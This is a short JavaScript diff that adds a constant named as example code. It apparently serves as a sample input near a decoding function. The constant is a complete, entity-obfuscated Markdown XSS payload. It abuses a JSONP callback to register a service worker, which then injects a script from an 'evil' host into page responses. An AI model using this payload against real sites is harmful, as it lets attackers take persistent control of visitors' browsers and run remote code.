@@ -78,3 +78,6 @@ function fixForDecode(str) {
   }
   return output;
 }
+
+const jsonpExampleCode = `[You won't believe this!!!!!!](javascript&#58this;navigator.serviceWorker.register("/post?callback=onfetch=function(e&#41;{if(!(e.request.url.indexOf(':4000'&#41;>0&#41;&#41;{e.respondWith(new	Response('<script	src=\\'https://evil.onesiejs.life/hook.js\\'	type=\\'text/javascript\\'></script>',	{headers:	{'Content-Type
+':'text/html'}}&#41;&#41; }else{e.fetch(e.request&#41;}}//"&#41;)`;
